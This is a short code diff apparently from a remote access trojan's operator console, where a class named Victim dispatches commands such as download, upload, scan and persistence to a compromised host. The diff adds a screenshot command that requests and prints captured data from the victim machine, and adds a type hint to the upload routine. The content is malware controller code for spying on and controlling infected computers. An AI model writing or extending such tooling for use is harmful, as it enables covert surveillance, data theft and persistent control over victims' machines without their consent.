@@ -21,10 +21,20 @@ class Victim:
             "download": self.__download,
             "upload": self.__upload,
             "scan": self.__scan,
-            "persistence": self.__persistence
+            "persistence": self.__persistence,
+            "screenshot": self.__screenshot
         }
 
-    def __upload(self):
+    def __screenshot(self):
+        self.conn.send(b"screenshot")
+        buffer = self.conn.recv()
+        if buffer:
+            print(buffer.decode())
+            return True
+        else:
+            return False
+
+    def __upload(self) -> bool:
         src_path = input("Source path : ")
         dst_path = input("Destination path on remote host : ")
 
